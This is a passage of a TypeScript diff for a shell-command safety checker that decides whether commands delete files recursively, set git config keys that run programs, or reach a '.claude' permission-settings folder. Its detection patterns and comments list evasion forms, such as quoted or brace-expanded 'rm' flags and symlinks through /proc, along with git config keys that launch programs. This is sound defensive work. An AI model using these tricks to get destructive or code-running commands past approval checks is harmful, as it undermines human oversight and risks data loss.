+ * literal one unless dotglob is on, which still never matches `.` or `..`. Case is ignored, which only asks more.
+ * The match is linear in practice: a mismatch backtracks only to the last star.
+ */
+export function globMatches(pattern: readonly GlobChar[], name: string, dotGlob: boolean): boolean {
+  const first = pattern[0];
+  const literalDot = first !== undefined && !first.glob && first.char === '.';
+  if (name.startsWith('.') && !literalDot && !(dotGlob && name !== '.' && name !== '..')) return false;
+  const tokens = globTokens(pattern);
+  const chars = Array.from(name);
+  let token = 0;
+  let char = 0;
+  let star = -1;
+  let resume = 0;
+  while (char < chars.length) {
+    const current = tokens[token];
+    if (current?.kind === 'star') {
+      star = token++;
+      resume = char;
+    } else if (current?.kind === 'one' && current.matches(chars[char] as string)) {
+      token++;
+      char++;
+    } else if (star !== -1) {
+      token = star + 1;
+      char = ++resume;
+    } else {
+      return false;
+    }
+  }
+  while (tokens[token]?.kind === 'star') token++;
+  return token === tokens.length;
+}
+
+/** What a glob operand can reach beyond the folder it expands under. */
+interface GlobShape {
+  /** Its first component cannot match a name that starts with a dot. */
+  dotless: boolean;
+  /** Components that can walk up a folder (`..`, or `.?` in a bash without globskipdots). */
+  up: number;
+  /** A component can match `.claude`, the folder holding a project's permission settings. */
+  namesSettings: boolean;
+}
+
+function globShape(word: OperandWord, start: number, dotGlob: boolean, separator: RegExp): GlobShape {
+  let from = start;
+  while (from > 0 && !separator.test(word.text[from - 1] as string)) from--;
+  let current: GlobChar[] = [];
+  const components: GlobChar[][] = [current];
+  for (let at = from; at < word.text.length; at++) {
+    const char = word.text[at] as string;
+    if (separator.test(char)) {
+      current = [];
+      components.push(current);
+    } else {
+      current.push({ char, glob: word.glob[at] === true, active: word.active?.[at] ?? true });
+    }
+  }
+  const patterns = components.filter(component => component.some(piece => piece.glob));
+  const up = components.filter(
+    component =>
+      component.map(piece => piece.char).join('') === '..' ||
+      (component.some(piece => piece.glob) && globMatches(component, '..', dotGlob))
+  ).length;
+  const first = components[0]?.[0];
+  return {
+    dotless: up === 0 && !dotGlob && !(first !== undefined && !first.glob && first.char === '.'),
+    up,
+    namesSettings: patterns.some(pattern => globMatches(pattern, '.claude', dotGlob)),
+  };
+}
+
+/** A script that may turn on dotglob, so a leading `*` can match a dotfile. */
+const MAY_SET_DOTGLOB = /shopt|GLOBIGNORE|BASHOPTS|dotglob/;
+
+/** Whether git reads the variable `name` in this process's environment as true. */
+const gitEnvTrue = (name: string): boolean => !/^(false|no|off|0*)$/i.test(process.env[name] ?? '');
+
+type Reach = 'read' | 'write';
+
+/** Programs that unpack an archive into a folder, so `inPlaceWrites` names their trees. */
+const UNPACKS = new Set(['tar', 'bsdtar', 'unzip', '7z', '7za', '7zz', 'cpio']);
+
+// The leading letters of each short-option word, so a cluster ending in a glued value (`-rt..`) still counts its flags.
+const shortFlags = (args: readonly string[]): string =>
+  args.map(arg => /^-([A-Za-z]+)/.exec(wordValue(arg))?.[1] ?? '').join('');
+
+/** Short options of the copying programs whose value is the rest of their word, or the next word when they end it. */
+const COPY_VALUE_LETTERS = new Map([
+  ['cp', 'St'],
+  ['mv', 'St'],
+  ['ln', 'St'],
+  ['install', 'Stmog'],
+]);
+
+interface CopyTarget {
+  /** The word holding the folder: the option's own word when `glued`, else the word after it. */
+  index: number;
+  /** The folder as written, quotes kept unless the whole option word was quoted. */
+  value: string;
+  glued: boolean;
+}
+
+/** rsync options that take their value as the next word when not written `--name=value`. */
+const RSYNC_VALUED_LONG = new Set([
+  'exclude',
+  'include',
+  'filter',
+  'exclude-from',
+  'include-from',
+  'files-from',
+  'rsh',
+  'rsync-path',
+  'partial-dir',
+  'backup-dir',
+  'suffix',
+  'compare-dest',
+  'copy-dest',
+  'link-dest',
+  'temp-dir',
+  'chmod',
+  'chown',
+  'usermap',
+  'groupmap',
+  'log-file',
+  'out-format',
+  'port',
+  'address',
+  'timeout',
+  'contimeout',
+  'block-size',
+  'max-size',
+  'min-size',
+  'max-delete',
+  'modify-window',
+  'skip-compress',
+  'protocol',
+  'sockopts',
+  'info',
+  'debug',
+  'bwlimit',
+  'read-batch',
+  'write-batch',
+  'only-write-batch',
+  'password-file',
+  'checksum-choice',
+  'compress-choice',
+  'compress-level',
+  'iconv',
+  'stop-after',
+  'stop-at',
+  'max-alloc',
+  'early-input',
+  'outbuf',
+  'remote-option',
+]);
+
+/** The operands of a cp or rsync call, without the words that are an option's value. */
+function copyOperands(program: string, args: readonly string[]): string[] {
+  const operands: string[] = [];
+  const letters = program === 'rsync' ? 'efTBM' : 'St';
+  const valued = (name: string): boolean =>
+    program === 'rsync'
+      ? RSYNC_VALUED_LONG.has(name)
+      : name !== '' && ['target-directory', 'suffix'].some(long => long.startsWith(name));
+  for (let index = 0; index < args.length; index++) {
+    const raw = args[index] as string;
+    const arg = unquote(raw);
+    if (arg === '--') {
+      operands.push(...args.slice(index + 1));
+      break;
+    }
+    if (!arg.startsWith('-') || arg === '-') operands.push(raw);
+    else if (arg.startsWith('--')) {
+      if (!arg.includes('=') && valued(arg.slice(2))) index++;
+    } else {
+      for (let at = 1; at < arg.length; at++) {
+        if (!letters.includes(arg[at] as string)) continue;
+        if (at === arg.length - 1) index++;
+        break;
+      }
+    }
+  }
+  return operands;
+}
+
+/** The folder a `cp`, `mv`, `ln` or `install` copies into by `-t`, `-rtDIR`, `--target-directory=DIR` or `--target DIR`. */
+function copyTarget(program: string, args: readonly string[]): CopyTarget | null {
+  const letters = COPY_VALUE_LETTERS.get(program);
+  if (letters === undefined) return null;
+  const next = (index: number): CopyTarget | null =>
+    index + 1 < args.length ? { index: index + 1, value: args[index + 1] as string, glued: false } : null;
+  for (let index = 0; index < args.length; index++) {
+    const raw = args[index] as string;
+    const arg = unquote(raw);
+    const offset = raw === arg ? 0 : 1;
+    if (arg === '--') return null;
+    if (arg.startsWith('--')) {
+      const equals = arg.indexOf('=');
+      const name = arg.slice(2, equals === -1 ? undefined : equals);
+      // getopt_long takes any unambiguous prefix, and no other long option of these starts with `t`.
+      if (name === '' || !'target-directory'.startsWith(name)) continue;
+      return equals === -1
+        ? next(index)
+        : { index, value: raw.slice(offset + equals + 1, raw.length - offset), glued: true };
+    }
+    if (!arg.startsWith('-')) continue;
+    for (let at = 1; at < arg.length; at++) {
+      const letter = arg[at] as string;
+      if (!letters.includes(letter)) continue;
+      if (letter === 't') {
+        return at + 1 < arg.length
+          ? { index, value: raw.slice(offset + at + 1, raw.length - offset), glued: true }
+          : next(index);
+      }
+      if (at + 1 === arg.length) index++;
+      break;
+    }
+  }
+  return null;
+}
+
+/**
+ * The replace string an xargs among the leading wrappers builds its command around (`-I R`, `-i`, `--replace`),
+ * '' when the scan cannot read it, or null without one.
+ */
+function xargsReplace(tokens: readonly string[]): string | null {
+  let replace: string | null = null;
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]);) {
+    if (programName(unquote(tokens[at])) === 'xargs') {
+      for (const { option, value } of givenOptions(tokens, at)) {
+        if (option !== 'I' && option !== 'i' && option !== 'replace') continue;
+        const text = value === undefined ? (option === 'I' ? '' : '{}') : isDynamic(value) ? '' : wordValue(value);
+        replace = replace === null || replace === text ? text : '';
+      }
+    }
+    const end = pastWrapper(tokens, at);
+    if (end <= at) break;
+    at = end;
+  }
+  return replace;
+}
+
+/** `git config` keys whose value is a program git runs, or a file of more config. Case is ignored, as git does. */
+const GIT_PROGRAM_CONFIG =
+  /^(core\.(fsmonitor|sshcommand|pager|editor|hookspath|gitproxy|askpass|alternaterefscommand)|alias\..+|.+\.textconv|diff\.external|.+(cmd|command)|(man|browser|difftool|mergetool)\..+\.path|credential\..+|filter\..+|sequence\.editor|gpg(\..+)?\.program|merge\..+\.driver|pager\..+|uploadpack\.packobjectshook|gc\.recentobjectshook|remote\..+\.(uploadpack|receivepack)|include(if\..+)?\.path|protocol\.(.+\.)?allow|help\.autocorrect|submodule\..+\.update|interactive\.difffilter|imap\.tunnel|sendemail\.(.+\.)?smtpserver|instaweb\.httpd)$/i;
+
+/** Whether git config setting `key` to `value` (undefined when unknown) has git run a program it names. */
+function configRunsProgram(key: string, value: string | undefined): boolean {
+  // A tool name, or the `<vcs>` of the `git-remote-<vcs>` git runs, is a path to a program when it holds a slash.
+  if (/^((diff|merge)\.(gui)?tool|remote\..+\.vcs)$/i.test(key)) return value === undefined || TOOL_PATH.test(value);
+  return GIT_PROGRAM_CONFIG.test(key);
+}
+
+/** `pattern` over environment variable names, which match in any case on Windows. */
+const variableNames = (pattern: RegExp): RegExp =>
+  process.platform === 'win32' ? new RegExp(pattern.source, `${pattern.flags}i`) : pattern;
+
+/** `git config` options whose value is the next word. */
+const GIT_CONFIG_VALUED = new Set(['-f', '--file', '--blob', '--type', '--default', '--comment', '--value']);
+
+/** What a `git config` call's words (unquoted, after `config`) ask: its operands, and the kind of call they make. */
+function gitConfigWords(args: readonly string[]): {
+  operands: string[];
+  reads: boolean;
+  edits: boolean;
+  removes: boolean;
+  adds: boolean;
+} {
+  const words = { operands: [] as string[], reads: false, edits: false, removes: false, adds: false };
+  for (let index = 0; index < args.length; index++) {
+    const arg = args[index] as string;
+    if (/^(-l|--list|--get.*)$/.test(arg)) words.reads = true;
+    else if (/^(--edit|-e)$/.test(arg)) words.edits = true;
+    else if (/^(--unset.*|--rename-section|--remove-section)$/.test(arg)) words.removes = true;
+    else if (/^(--add|--replace-all)$/.test(arg)) words.adds = true;
+    if (GIT_CONFIG_VALUED.has(arg)) index++;
+    else if (!arg.startsWith('-')) words.operands.push(arg);
+  }
+  return words;
+}
+
+/** The key a `git config` call sets when that key makes git run a program, else null. */
+function gitConfigProgram(tokens: readonly string[]): string | null {
+  const [git, sub, ...args] = commandTokens(tokens).map(unquote);
+  if (programName(git ?? '') !== 'git' || sub !== 'config') return null;
+  const { operands, reads, edits, removes } = gitConfigWords(args);
+  if (reads || edits || removes) return null;
+  if (operands[0] === 'set') operands.shift();
+  else if (/^(get|list|unset|edit|rename-section|remove-section)$/.test(operands[0] ?? '')) return null;
+  const [key, value] = operands;
+  return key !== undefined && value !== undefined && configRunsProgram(key, value) ? key : null;
+}
+
+/**
+ * The operands a command acts on as whole folders, by index into `args`, read (`grep -r`) or written (`rm -r`,
+ * `mv`, a copy's destination, `find -delete`); `cwd` is the reach of a command that defaults to its folder.
+ */
+function treeOperands(
+  program: string,
+  args: readonly string[]
+): { operands: Map<number, Reach>; cwd: Reach | null; glued: Reach | null } {
+  const operands = new Map<number, Reach>();
+  const flags = shortFlags(args);
+  const longs = new Set(args.map(unquote).filter(arg => arg.startsWith('--')));
+  const positional = args.flatMap((arg, index) => (unquote(arg).startsWith('-') ? [] : [index]));
+  const mark = (indices: readonly number[], reach: Reach): void => {
+    for (const index of indices) operands.set(index, reach);
+  };
+  let glued: Reach | null = null;
+  // A copy writes its destination (the last operand, or the target folder option's value) and reads the rest.
+  const copy = (): void => {
+    const target = copyTarget(program, args);
+    mark(positional, 'read');
+    if (target?.glued) glued = 'write';
+    else {
+      const destination = target === null ? positional.at(-1) : target.index;
+      if (destination !== undefined) operands.set(destination, 'write');
+    }
+  };
+  // grep and rg take a pattern first unless `-e` or `-f` gives it.
+  const searched = (): number[] =>
+    args.some(arg => /^-[A-Za-z]*[ef]$|^--(regexp|file)(=|$)/.test(unquote(arg))) ? positional : positional.slice(1);
+  switch (program) {
+    case 'rm':
+      if (/[rR]/.test(flags) || longs.has('--recursive')) mark(positional, 'write');
+      break;
+    case 'chmod':
+    case 'chown':
+    case 'chgrp':
+      if (flags.includes('R') || longs.has('--recursive')) mark(positional.slice(1), 'write');
+      break;
+    case 'mv':
+      mark(positional, 'write');
+      if (copyTarget(program, args)?.glued) glued = 'write';
+      break;
+    case 'cp':
+    case 'scp':
+      if (/[rRa]/.test(flags) || longs.has('--recursive') || longs.has('--archive')) copy();
+      break;
+    case 'rsync':
+      copy();
+      break;
+    case 'find': {
+      const end = args.findIndex(arg => /^[-(!]/.test(unquote(arg)));
+      const paths = positional.filter(index => end === -1 || index < end);
+      const reach = findActions(args).reach;
+      mark(paths, reach);
+      return { operands, cwd: paths.length === 0 ? reach : null, glued };
+    }
+    case 'grep':
+    case 'egrep':
+    case 'fgrep':
+    case 'rgrep':
+    case 'rg': {
+      const recursive =
+        program === 'rg' ||
+        program === 'rgrep' ||
+        /[rR]/.test(flags) ||
+        longs.has('--recursive') ||
+        longs.has('--dereference-recursive');
+      if (!recursive) break;
+      const files = searched();
+      mark(files, 'read');
+      return { operands, cwd: files.length === 0 ? 'read' : null, glued };
+    }
+    case 'tar':
+    case 'bsdtar':
+    case 'zip':
+      mark(positional, 'read');
+      break;
+  }
+  return { operands, cwd: null, glued };
+}
+
+/** Names a `find -name` pattern must not match for a delete to leave the session's settings alone. */
+const SETTINGS_NAMES = ['.claude', 'settings.json', 'settings.local.json'];
+
+/** Whether a `find -name` pattern may match a settings name; one with an escape is not read. */
+const mayNameSettings = (pattern: string): boolean =>
+  pattern.includes('\\') ||
+  SETTINGS_NAMES.some(name =>
+    globMatches(
+      [...pattern].map(char => ({ char, glob: '*?['.includes(char), active: true })),
+      name,
+      true
+    )
+  );
+
+/**
+ * What a find expression does to the tree it walks: `write` for `-delete`, `rm {}` or an `-fprint` file, unless
+ * the delete follows only ANDed `-name`/`-type` tests none of which can match a settings name. A program it runs
+ * (`-exec`, `-ok`, and the `dir` forms) is `untrackable` unless its other operands are static, which are returned
+ * in `reads`, and it only reads or is an `-exec`; none is a shell, even behind a wrapper. Such a `writer` writes
+ * what find prints. `runs` holds each program's words, which are judged as a command of their own would be.
+ * `removes` is set by any `-delete`, any `rm` it runs past wrappers, or a program that deletesFiles counts, narrowed
+ * or not.
+ */
+export function findActions(args: readonly string[]): {
+  reach: Reach;
+  untrackable: boolean;
+  writer: boolean;
+  removes: boolean;
+  reads: string[];
+  runs: string[][];
+} {
+  const words = args.map(wordValue);
+  let write = false;
+  let untrackable = false;
+  let writer = false;
+  let removes = false;
+  const runs: string[][] = [];
+  const reads: string[] = [];
+  let narrowed = true;
+  let named = false;
+  const deletes = (): void => {
+    removes = true;
+    if (!(narrowed && named)) write = true;
+  };
+  for (let at = 0; at < words.length; at++) {
+    const word = words[at] as string;
+    if (/^-(exec|execdir|ok|okdir)$/.test(word)) {
+      const end = words.findIndex((value, index) => index > at && (value === ';' || value === '+'));
+      if (end === -1) return { reach: 'write', untrackable: true, writer, removes, reads, runs };
+      const inner = args.slice(at + 1, end);
+      const values = words.slice(at + 1, end);
+      const operands = values.slice(1).filter(value => !value.startsWith('-'));
+      const plain = !inner.some(isDynamic) && values.every(value => value === '{}' || !value.includes('{}'));
+      const reading = onlyReads(inner) && (word.endsWith('dir') ? operands.every(value => value === '{}') : true);
+      // The program is read as one xargs runs: past its wrappers, and never a shell.
+      const [program = '', ...programArgs] = withoutWrappers(inner);
+      const effects = wrapperEffects(inner);
+      const opaque =
+        untrackableCommand(inner) ||
+        effects.unread ||
+        effects.folders.length + effects.outputs.length > 0 ||
+        XARGS_SHELLS.has(programName(unquote(program))) ||
+        runsOpaqueScript(programName(unquote(program)), programArgs);
+      runs.push(inner);
+      const writing = word === '-exec';
+      if (programName(wordValue(program)) === 'rm' || deletesFiles(inner)) removes = true;
+      if (opaque) untrackable = true;
+      else if (programName(values[0] ?? '') === 'rm' && operands.every(value => value === '{}')) deletes();
+      else if (plain && (reading || writing)) {
+        writer ||= !reading;
+        reads.push(
+          ...inner
+            .slice(1)
+            .filter((raw, index) => !(values[index + 1] as string).startsWith('-') && values[index + 1] !== '{}')
+        );
+      } else untrackable = true;
+      at = end;
+    } else if (word === '-delete') {
+      deletes();
+    } else if (/^-(fprint0?|fprintf|fls)$/.test(word)) {
+      write = true;
+      at++;
+    } else if (/^-i?name$/.test(word)) {
+      const pattern = words[++at];
+      if (pattern === undefined || mayNameSettings(pattern)) narrowed = false;
+      named = true;
+    } else if (/^-(type|maxdepth|mindepth)$/.test(word)) {
+      at++;
+    } else if (/^-(depth|xdev|mount|prune|print0?)$/.test(word)) {
+      continue;
+    } else if (word.startsWith('-') || ['(', ')', '!', ','].includes(word)) {
+      narrowed = false;
+    }
+  }
+  return { reach: write ? 'write' : 'read', untrackable, writer, removes, reads, runs };
+}
+
+/** Programs that delete each operand's whole tree, as `rm -rf` does. */
+const TREE_REMOVERS: ReadonlySet<string> = new Set(['rimraf']);
+
+/** rsync options that delete files at the destination or the source. */
+const RSYNC_DELETES = /^--(del|delete(-[a-z-]+)?|remove-source-files)(=|$)/;
+
+/** The text a word opens with, as bash hands it over, up to its first `$` or backquote expansion. */
+function leadingText(word: string): string {
+  let quote: '"' | "'" | null = null;
+  for (let at = 0; at < word.length; at++) {
+    const char = word[at];
+    if (quote === "'") {
+      if (char === "'") quote = null;
+    } else if (char === '\\') at++;
+    else if (char === '$' || char === '`') return wordValue(word.slice(0, at));
+    else if (quote === '"' && char === '"') quote = null;
+    else if (quote === null && (char === '"' || char === "'")) quote = char;
+  }
+  return wordValue(word);
+}
+
+/** An expansion that opens a word, or follows only a `-`, may hand the program an option the scan cannot see. */
+const mayExpandToOption = (word: string): boolean => isDynamic(word) && /^-?$/.test(leadingText(word));
+
+/**
+ * Whether rm's arguments ask for a recursive or forced delete. Each word is read as bash hands it over (`"-"rf`,
+ * `\-rf`), a short-option word counts any `r`, `R` or `f` (rm takes no option values) or a glob or brace that may
+ * expand to one, and so does a word an expansion may turn into an option; nothing after a plain `--` is an option.
+ */
+function rmRecursesOrForces(args: readonly string[]): boolean {
+  for (const arg of args) {
+    if (mayExpandToOption(arg)) return true;
+    const value = wordValue(arg);
+    if (value === '--') return false;
+    if (/^-[^-]/.test(value) && /[rRf*?[{]/.test(value.slice(1))) return true;
+    // A brace with an alternative that opens with `-` (`{-r,x}`) expands to an option word.
+    if (/^\{(-|[^}]*,-)[^}]*\}/.test(value)) return true;
+    // GNU rm takes any unambiguous prefix of a long option, e.g. `--rec`.
+    const long = /^--([^=]+)/.exec(value)?.[1];
+    if (long !== undefined && ['recursive', 'force'].some(full => full.startsWith(long))) return true;
+  }
+  return false;
+}
+
+/**
+ * Whether a command line handed over as text (`sh -c`, `eval`, GNU parallel, `npm exec -c`) holds a delete. The
+ * text is split at blanks and shell operators and every position is tried as a command start, so a form the split
+ * misreads errs toward counting it.
+ */
+function textDeletes(args: readonly string[], depth: number): boolean {
+  if (depth > 4) return true;
+  const words = args
+    .map(wordValue)
+    .join(' ')
+    .split(/[\s;&|()]+/)
+    .filter(Boolean);
+  return words.some((_, at) => deletesFiles(words.slice(at), depth + 1));
+}
+
+/**
+ * Whether a command deletes files recursively or forcefully, which the approval card says and which keeps it off
+ * one-click surfaces. The program is read past its wrappers (`sudo`, `env`, `command`, `builtin`, `timeout`, `xargs`)
+ * and through what runs another command: package launchers (`pnpm exec`, `npx`), shells given `-c`, `eval`, GNU
+ * parallel and `find -exec`. A launcher whose operands the scan cannot place is read as text, so it fails closed.
+ */
+export function deletesFiles(tokens: readonly string[], depth = 0): boolean {
+  const words = withoutWrappers(tokens);
+  const [first = '', ...args] = words;
+  const name = programName(wordValue(first));
+  if (name === 'builtin') return deletesFiles(args, depth);
+  if (name === 'rm') return rmRecursesOrForces(args);
+  if (TREE_REMOVERS.has(name)) return true;
+  if (name === 'find') return findActions(args).removes;
+  if (name === 'rsync') return args.some(arg => mayExpandToOption(arg) || RSYNC_DELETES.test(wordValue(arg)));
+  if (name === 'git') {
+    const values = args.map(wordValue);
+    const git = gitSubcommand(values, '.');
+    if (git?.unread) return values.includes('clean');
+    // `-e` takes the rest of its word (or, ending it, the next word), so an `n` there is the pattern, not `-n`.
+    return (
+      git?.sub === 'clean' &&
+      !git.rest.some(
+        (arg, at) =>
+          /^(-[A-Za-df-z]*n|--dry-run$)/.test(arg) && !/^(-[A-Za-z]*e|--exclude)$/.test(git.rest[at - 1] ?? '')
+      )
+    );
+  }
+  if (name === 'eval' || name === 'parallel') return textDeletes(args, depth);
+  if (XARGS_SHELLS.has(name)) {
+    return args.some(arg => /^-[A-Za-z]*c/.test(wordValue(arg))) && textDeletes(args, depth);
+  }
+  const launched = packageCommand(words);
+  if (launched === null) return false;
+  return launched.unread ? textDeletes(args, depth) : deletesFiles(words.slice(launched.at), depth);
+}
+
+/** find primaries that act rather than test. */
+const FIND_ACTION = /^-(exec|execdir|ok|okdir|print0?|printf|fprint0?|fprintf|ls|fls|delete|quit)$/;
+
+/**
+ * A find command's words, as written, before its one `-exec`, when that is the last primary and no other action
+ * comes before it, so the program is handed what the rest would print; null otherwise.
+ */
+function execAsPrint(args: readonly string[]): string[] | null {
+  const words = args.map(wordValue);
+  const start = words.findIndex(value => FIND_ACTION.test(value));
+  if (start === -1 || words[start] !== '-exec') return null;
+  const end = words.findIndex((value, index) => index > start && (value === ';' || value === '+'));
+  return end === words.length - 1 ? args.slice(0, start) : null;
+}
+
+/** Whether a command that walks a tree follows the links it finds there, not only those it is given. */
+function followsLinks(program: string, args: readonly string[]): boolean {
+  const flags = shortFlags(args);
+  const longs = args.map(arg => unquote(arg).split('=')[0] as string).filter(arg => arg.startsWith('--'));
+  const given = (...names: string[]): boolean => longs.some(arg => names.includes(arg));
+  switch (program) {
+    case 'grep':
+    case 'egrep':
+    case 'fgrep':
+      return flags.includes('R') || given('--dereference-recursive');
+    case 'rg':
+      return flags.includes('L') || given('--follow');
+    case 'find':
+      return args.some(arg => /^-(L|follow)$/.test(unquote(arg)));
+    case 'cp':
+      return /[LH]/.test(flags) || given('--dereference');
+    case 'rsync':
+      return /[Lk]/.test(flags) || given('--copy-links', '--copy-dirlinks');
+    case 'du':
+    case 'ls':
+      return flags.includes('L') || given('--dereference');
+    case 'tree':
+      return flags.includes('l');
+    case 'tar':
+    case 'bsdtar':
+      return flags.includes('h') || given('--dereference');
+    case 'zip':
+      return !flags.includes('y') && !given('--symlinks');
+    case 'chmod':
+    case 'chown':
+    case 'chgrp':
+      return flags.includes('L');
+    case 'diff':
+      return (flags.includes('r') || given('--recursive')) && !given('--no-dereference');
+    default:
+      return false;
+  }
+}
+
+/** Entries a glob expansion or a link walk may read before the operand counts as unread. */
+const WALK_ENTRIES = 10000;
+const GLOB_MATCHES = 256;
+
+/** A failed fs call that means the path is not there, as opposed to one the scan could not read. */
+const missing = (error: unknown): boolean => {
+  const code = (error as NodeJS.ErrnoException | null)?.code;
+  return code === 'ENOENT' || code === 'ENOTDIR';
+};
+
+/** `name` under `folder` as bash spells it, without folding `..` the way path.join would. */
+const under = (folder: string, name: string): string => (folder.endsWith('/') ? folder + name : `${folder}/${name}`);
+
+/**
+ * Each absolute path a glob word expands to, found component by component with lstat as bash expands it, with
+ * whether it passes through a symbolic link. Null when the expansion reads more than WALK_ENTRIES entries or makes
+ * more than GLOB_MATCHES paths.
+ */
+async function globExpansion(
+  word: OperandWord,
+  cwd: string,
+  dotGlob: boolean,
+  stopped: () => boolean
+): Promise<{ path: string; linked: boolean }[] | null> {
+  const components: GlobChar[][] = [[]];
+  for (let at = 0; at < word.text.length; at++) {
+    const char = word.text[at] as string;
+    if (char === '/') components.push([]);
+    else
+      components[components.length - 1]?.push({
+        char,
+        glob: word.glob[at] === true,
+        active: word.active?.[at] ?? true,
+      });
+  }
+  let found = [{ path: word.text.startsWith('/') ? '/' : cwd, linked: false }];
+  let entries = 0;
+  for (const component of components) {
+    if (component.length === 0) continue;
+    const next: typeof found = [];
+    for (const { path, linked } of found) {
+      if (stopped()) return null;
+      let names = [component.map(piece => piece.char).join('')];
+      if (component.some(piece => piece.glob)) {
+        const listed = await readdir(path).catch((error: unknown) => (missing(error) ? [] : null));
+        if (listed === null) return null;
+        names = listed.filter(name => globMatches(component, name, dotGlob));
+      }
+      entries += names.length;
+      if (entries > WALK_ENTRIES) return null;
+      for (const name of names) {
+        if (stopped()) return null;
+        const info = await lstat(under(path, name)).catch((error: unknown) => (missing(error) ? undefined : null));
+        if (info === null) return null;
+        // What lies past a link into a process folder exists for bash, not for this process.
+        if (info?.isSymbolicLink() && (await linksThroughProcess(under(path, name))) !== false) return null;
+        if (info) next.push({ path: under(path, name), linked: linked || info.isSymbolicLink() });
+      }
+      if (next.length > GLOB_MATCHES) return null;
+    }
+    found = next;
+  }
+  return found;
+}
+
+/** Links resolved for one path before it counts as unread, as the kernel gives up at 40. */
+const MAX_LINK_HOPS = 40;
+
+/**
+ * Whether resolving `path` component by component, as the kernel does, passes a link into a process's own
+ * folders (`lk -> /proc/self/cwd/..`). Null when a link chain is too long or a component cannot be read.
+ */
+async function linksThroughProcess(path: string): Promise<boolean | null> {
+  if (HARMLESS_REDIRECT_TARGETS.has(path)) return false;
+  const parts = (text: string): string[] => text.split('/').filter(name => name !== '' && name !== '.');
+  const rest = parts(path);
+  let resolved = '/';
+  let hops = 0;
+  for (let name = rest.shift(); name !== undefined; name = rest.shift()) {
+    const next = name === '..' ? posix.dirname(resolved) : under(resolved, name);
+    let target: string | null = null;
+    try {
+      if (name !== '..' && (await lstat(next)).isSymbolicLink()) target = await readlink(next);
+    } catch (error) {
+      if (missing(error)) return false;
+      return null;
+    }
+    if (target === null) {
+      resolved = next;
+    } else {
+      if (++hops > MAX_LINK_HOPS) return null;
+      rest.unshift(...parts(target));
+      if (target.startsWith('/')) resolved = '/';
+    }
+    if (PROCESS_LINK.test(resolved)) return true;
+  }
+  return false;
+}
+
+/** Links inside the tree at `root`, by a walk that enters none of them; null once `budget` runs out or `stopped`. */
+async function linksUnder(root: string, budget: { entries: number }, stopped: () => boolean): Promise<string[] | null> {
+  const links: string[] = [];
+  const folders = [root];
+  for (let folder = folders.pop(); folder !== undefined; folder = folders.pop()) {
+    if (stopped()) return null;
+    const entries = await readdir(folder, { withFileTypes: true }).catch((error: unknown) =>
+      missing(error) ? [] : null
+    );
+    if (entries === null) return null;
+    budget.entries -= entries.length;
+    if (budget.entries < 0) return null;
+    for (const entry of entries) {
+      if (entry.isSymbolicLink()) links.push(under(folder, entry.name));
+      else if (entry.isDirectory()) folders.push(under(folder, entry.name));
+    }
+  }
+  return links;
+}
+
+/** Options whose value is a folder or file, so an expansion there is an unread path. */
+const PATH_OPTIONS = new Set(['-C', '-d', '--directory', '--target-directory']);
+const PATH_OPTION_VALUE = /^(of|if|--directory|--target-directory)=/;
+
+/** Programs whose first operand, or `-e`'s value, is a pattern or a script rather than a path. */
+const PATTERN_FIRST: ReadonlyMap<string, { given: RegExp; values: RegExp }> = new Map([
+  ...['grep', 'egrep', 'fgrep', 'rgrep', 'rg'].map(
+    name => [name, { given: /^-[A-Za-z]*[ef]$|^--(regexp|file)(=|$)/, values: /^(-[A-Za-z]*e|--regexp)$/ }] as const
+  ),
+  ...['sed', 'gsed'].map(
+    name =>
+      [name, { given: /^-[A-Za-z]*[ef]$|^--(expression|file)(=|$)/, values: /^(-[A-Za-z]*e|--expression)$/ }] as const
+  ),
+  ...['awk', 'gawk', 'mawk', 'nawk'].map(
+    name =>
+      [
+        name,
+        { given: /^-[fE]$|^--(file|exec|source)(=|$)/, values: /^(-[eFv]|--source|--assign|--field-separator)$/ },
+      ] as const
+  ),
+]);
+
+/** Indices into `args` holding a pattern or script, which an expansion leaves no unread path in. */
+function patternWords(program: string, args: readonly string[]): Set<number> {
+  const shape = PATTERN_FIRST.get(program);
+  const words = new Set<number>();
+  if (!shape) return words;
+  for (const [index, arg] of args.entries()) if (shape.values.test(unquote(arg))) words.add(index + 1);
+  if (!args.some(arg => shape.given.test(unquote(arg)))) {
+    const first = args.findIndex((arg, index) => !unquote(arg).startsWith('-') && !words.has(index));
+    if (first !== -1) words.add(first);
+  }
+  return words;
+}
+
+/**
+ * Whether a sed script runs a program or reads or writes a file of its own (`e`, `r`, `w`, `s///w`,
+ * `s///e`). Anything it cannot parse counts too.
+ */
+export function sedScriptActs(script: string): boolean {
+  let at = 0;
+  const length = script.length;
+  const blanks = (): void => {
+    while (at < length && /[ \t]/.test(script[at] as string)) at++;
+  };
+  const until = (stops: RegExp): void => {
+    while (at < length && !stops.test(script[at] as string)) at++;
+  };
+  // Past the closing delimiter of a regex or replacement; false when there is none.
+  const delimited = (delimiter: string): boolean => {
+    for (; at < length; at++) {
+      if (script[at] === '\\') at++;
+      else if (script[at] === delimiter) {
+        at++;
+        return true;
+      }
+    }
+    return false;
+  };
+  const address = (): boolean => {
+    const char = script[at];
+    if (char !== undefined && /[\d$]/.test(char)) {
+      while (at < length && /[\d$~]/.test(script[at] as string)) at++;
+      return true;
+    }
+    if (char === '/' || char === '\\') {
+      const delimiter = char === '/' ? '/' : script[at + 1];
+      at += char === '/' ? 1 : 2;
+      if (delimiter === undefined || !delimited(delimiter)) return false;
+      while (at < length && /[IM]/.test(script[at] as string)) at++;
+    }
+    return true;
+  };
+  for (;;) {
+    while (at < length && /[\s;]/.test(script[at] as string)) at++;
+    if (at >= length) return false;
+    if (script[at] === '#') {
+      until(/\n/);
+      continue;
+    }
+    if (script[at] === '}') {
+      at++;
+      continue;
+    }
+    if (!address()) return true;
+    blanks();
+    if (script[at] === ',') {
+      at++;
+      blanks();
+      if (script[at] === '+' || script[at] === '~') {
+        at++;
+        while (at < length && /\d/.test(script[at] as string)) at++;
+      } else if (!address()) {
+        return true;
+      }
+    }
+    blanks();
+    while (script[at] === '!') {
+      at++;
+      blanks();
+    }
+    const command = script[at++];
+    if (command === undefined) return true;
+    if (command === '{') continue;
+    if (':btTv'.includes(command)) {
+      until(/[;\n]/);
+      continue;
+    }
+    if ('aic'.includes(command)) {
+      // Text to the end of the line, which a trailing backslash continues.
+      do until(/\n/);
+      while (script[at - 1] === '\\' && at++ < length);
+      continue;
+    }
+    if (command === 's' || command === 'y') {
+      const delimiter = script[at++];
+      if (delimiter === undefined || delimiter === '\\' || delimiter === '\n') return true;
+      if (!delimited(delimiter) || !delimited(delimiter)) return true;
